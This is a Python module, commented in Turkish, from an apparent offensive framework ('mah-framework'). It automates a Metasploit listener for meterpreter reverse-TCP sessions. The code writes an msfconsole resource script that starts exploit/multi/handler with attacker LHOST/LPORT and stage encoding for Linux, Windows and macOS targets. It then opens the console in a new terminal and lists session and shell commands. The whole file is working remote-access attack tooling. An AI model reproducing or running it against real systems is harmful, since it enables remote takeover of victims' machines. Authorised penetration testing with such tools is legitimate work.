"""
Meterpreter Reverse TCP Handler.

Bu handler, msfconsole'un yeni bir terminal penceresinde başlatılmasını
yönetir. mah-framework'ün kendi handler mekanizması yerine, bağlantı
yönetimini tamamen Metasploit'e devreder.

Akış:
  1. Kullanıcı `run` veya `exploit` komutunu çalıştırır.
  2. generate.py → msfvenom ile payload üretir.
  3. handler.py → msfconsole'u resource script ile yeni terminalde açar.
  4. mah-framework açık kalır, msfconsole ayrı pencerede çalışır.
"""

import os
import platform
import shutil
import subprocess
import tempfile
from typing import Any

from rich import print

from core.handler import BaseHandler


class Handler(BaseHandler):
    """
    Meterpreter Reverse TCP Handler.

    Bu handler geleneksel bir soket dinleyicisi değildir.
    Metasploit msfconsole'u yeni bir terminal penceresinde başlatarak
    exploit/multi/handler ile meterpreter bağlantılarını karşılar.

    mah-framework ana terminal penceresi açık kalır.
    """

    def __init__(self, options: dict[str, Any]) -> None:
        super().__init__(options)
        self.target_os = options.get("TARGET_OS", "linux")
        self.msfconsole_process = None
        self.rc_path = None

    # ── Payload haritası ─────────────────────────────────────────────────────
    _PAYLOAD_MAP = {
        "linux": "linux/x64/meterpreter/reverse_tcp",
        "windows": "windows/x64/meterpreter/reverse_tcp",
        "macos": "osx/x64/meterpreter/reverse_tcp",
    }

    @staticmethod
    def _detect_local_os() -> str:
        """Yerel makinenin OS'unu tespit eder."""
        system = platform.system().lower()
        if system == "darwin":
            return "macos"
        if system == "windows":
            return "windows"
        return "linux"

    def _create_resource_script(self) -> str:
        """msfconsole için resource script (RC) dosyası oluşturur."""
        msf_payload = self._PAYLOAD_MAP.get(
            self.target_os, "linux/x64/meterpreter/reverse_tcp"
        )

        rc_content = (
            "# mah-framework tarafından otomatik oluşturuldu\n"
            "# ────────────────────────────────────────────────\n"
            f"use exploit/multi/handler\n"
            f"set PAYLOAD {msf_payload}\n"
            f"set LHOST {self.lhost}\n"
            f"set LPORT {self.lport}\n"
            f"set ExitOnSession false\n"
            f"set EnableStageEncoding true\n"
            f"exploit -j -z\n"
            f"\n"
            f"echo ''\n"
            f"echo '[mah-framework] Handler aktif. Meterpreter bağlantısı bekleniyor...'\n"
            f"echo '[mah-framework] Payload hedefe ulaştığında oturum otomatik açılacak.'\n"
            f"echo ''\n"
        )

        self.rc_path = os.path.join(
            tempfile.gettempdir(), "mah_meterpreter_handler.rc"
        )
        with open(self.rc_path, "w") as f:
            f.write(rc_content)

        return self.rc_path

    def start(self) -> None:
        """
        Yeni bir terminal penceresinde msfconsole başlatır.
        mah-framework'ün kendi soket dinleyicisini kullanmaz.
        """
        rc_path = self._create_resource_script()
        msfconsole_cmd = f"msfconsole -r {rc_path}"

        local_os = self._detect_local_os()
        self.running = True

        print(f"[bold cyan]{'─'*55}[/bold cyan]")
        print(f"[bold cyan][*] Meterpreter Handler Başlatılıyor[/bold cyan]")
        print(f"[*] Hedef OS    : {self.target_os}")
        print(f"[*] MSF Payload : {self._PAYLOAD_MAP.get(self.target_os, '?')}")
        print(f"[*] Dinleyici   : {self.lhost}:{self.lport}")
        print(f"[*] RC Script   : {rc_path}")
        print(f"[bold cyan]{'─'*55}[/bold cyan]")

        try:
            if local_os == "macos":
                apple_script = (
                    f'tell application "Terminal"\n'
                    f"    activate\n"
                    f'    do script "{msfconsole_cmd}"\n'
                    f"end tell"
                )
                self.msfconsole_process = subprocess.Popen(
                    ["osascript", "-e", apple_script],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

            elif local_os == "linux":
                terminal = None
                for term_cmd in [
                    "gnome-terminal", "konsole", "xfce4-terminal",
                    "mate-terminal", "xterm", "lxterminal",
                    "terminator", "alacritty", "kitty",
                ]:
                    if shutil.which(term_cmd):
                        terminal = term_cmd
                        break

                if terminal is None:
                    print(
                        "[bold red][!] Terminal emülatörü bulunamadı.[/bold red]"
                    )
                    print(f"[*] Manuel çalıştırın: {msfconsole_cmd}")
                    self.running = False
                    return

                if terminal == "gnome-terminal":
                    self.msfconsole_process = subprocess.Popen(
                        [terminal, "--", "bash", "-c", msfconsole_cmd],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                elif terminal == "konsole":
                    self.msfconsole_process = subprocess.Popen(
                        [terminal, "-e", msfconsole_cmd],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                elif terminal in ("alacritty", "kitty"):
                    self.msfconsole_process = subprocess.Popen(
                        [terminal, "-e", "bash", "-c", msfconsole_cmd],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                else:
                    self.msfconsole_process = subprocess.Popen(
                        [terminal, "-e", f"bash -c '{msfconsole_cmd}'"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )

            elif local_os == "windows":
                self.msfconsole_process = subprocess.Popen(
                    ["cmd.exe", "/c", "start", "cmd.exe", "/k", msfconsole_cmd],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

            print(
                "\n[bold green][+] msfconsole yeni terminal penceresinde başlatıldı![/bold green]"
            )
            print("[*] mah-framework bu pencerede aktif kalmaya devam ediyor.")
            print(
                "[*] Meterpreter oturumları msfconsole penceresinde yönetilecek."
            )
            print(
                "[*] Meterpreter komutları: sessions, sessions -i <id>, sysinfo, shell..."
            )

        except FileNotFoundError as e:
            print(f"[bold red][!] Başlatma hatası: {e}[/bold red]")
            print(f"[*] Manuel çalıştırın: {msfconsole_cmd}")
            self.running = False
        except Exception as e:
            print(f"[bold red][!] Beklenmeyen hata: {e}[/bold red]")
            print(f"[*] Manuel çalıştırın: {msfconsole_cmd}")
            self.running = False

    def stop(self) -> None:
        """Handler'ı durdurur (msfconsole bağımsız çalışmaya devam eder)."""
        self.running = False
        # msfconsole kendi penceresinde bağımsız çalışır, kapatmıyoruz.
        # Kullanıcı isterse msfconsole'dan exit ile çıkabilir.
        print("[*] Meterpreter handler referansı kaldırıldı.")
        print("[*] msfconsole bağımsız çalışmaya devam ediyor (kapatmak için msfconsole'da 'exit' yazın).")

        # Geçici RC dosyasını temizle
        if self.rc_path and os.path.exists(self.rc_path):
            try:
                os.remove(self.rc_path)
            except OSError:
                pass

    def handle_connection(self, client_sock: Any, session_id: int | None = None) -> None:
        """
        Meterpreter bağlantıları msfconsole tarafından yönetilir.
        Bu handler doğrudan TCP bağlantıları kabul etmez.
        """
        print("[*] Meterpreter bağlantıları msfconsole üzerinden yönetilir.")
        return

    def interact(self, session_id: int) -> None:
        """
        Meterpreter etkileşimi msfconsole penceresinde yapılır.
        """
        print(f"[*] Meterpreter oturumları msfconsole penceresinden yönetilir.")
        print(f"[*] msfconsole penceresine geçiş yapın ve 'sessions -i {session_id}' yazın.")
